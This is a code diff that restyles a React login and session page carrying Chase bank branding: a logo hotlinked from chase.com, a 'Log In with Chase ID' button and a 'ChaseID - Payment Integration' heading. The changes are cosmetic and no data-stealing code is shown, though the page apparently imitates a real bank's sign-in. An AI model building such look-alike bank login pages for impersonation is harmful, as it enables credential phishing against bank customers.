@@ -85,7 +85,7 @@ function EmailLogin(props) {
         />
         </div>
         <div className="mt-2">
-        <input type="submit" disabled={!!codeConfirmed} className={(codeConfirmed ? 'opacity-30 ' : '') + " flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"} value="Log In with Chase ID" />
+        <input type="submit" disabled={!!codeConfirmed} className={(codeConfirmed ? 'opacity-30 ' : '') + " flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 bg-[#0b6efd] hover:bg-[#1f304d] text-white font-bold py-2 px-4 rounded"} value="Log In with Chase ID" />
         </div>
       </form>
       </div>
@@ -150,24 +150,24 @@ export default function Session() {
   }
 
   return (
-    <div>
+    <div className="mt-2">
       <header className="flex items-center justify-between p-4 bg-grey text-white">
         <div className="flex lg:flex-1">
           <a href="#" className="-m-1.5 p-1.5">
-            <img className="h-8 w-auto" src="https://www.chase.com/etc/designs/chase-ux/css/img/newheaderlogo.svg" alt="" />
+            <img className="h-6 w-auto" src="https://www.chase.com/etc/designs/chase-ux/css/img/newheaderlogo.svg" alt="" />
           </a>
         </div>
       <nav className="flex space-x-4">
-        <a href="#" className="text-black hover:text-gray-300">LogIn</a>
-        <a href="#" className="text-black hover:text-gray-300">About</a>
-        <a href="#" className="text-black hover:text-gray-300">Customer Service</a>
+        <a href="#" className="text-black hover:text-blue-500 font-sans">Login</a>
+        <a href="#" className="text-black hover:text-blue-500 font-sans">About</a>
+        <a href="#" className="text-black hover:text-blue-500 font-sans">Customer Service</a>
       </nav>
     </header>
-      <div >
+      <div  >
         <script src="https://cdn.tailwindcss.com"></script>
         {/* <h1>{ router.query.session_id }</h1> */}
-        <h2 className="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-gray-900">
-              Sign in to your ChaseID account
+        <h2 className="mt-5 text-center text-2xl font-bold leading-9 tracking-tight text-white bg-[#126bc5]">
+              ChaseID - Payment Integration
             </h2>
 
         <EmailLogin onConfirmUser={(user) => {
@@ -200,7 +200,7 @@ export default function Session() {
             />
           )
         }
-        <button className="mt-10 sm:mx-auto sm:w-full sm:max-w-sm mt-2 flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" onClick={onSubmitForm}>Submit</button>
+        <button className="mt-10 sm:mx-auto sm:w-full sm:max-w-sm mt-2 flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 bg-[#0b6efd] hover:bg-[#1f304d] text-white font-bold py-2 px-4 rounded" onClick={onSubmitForm}>Submit</button>
       </div>
     </div>
   )
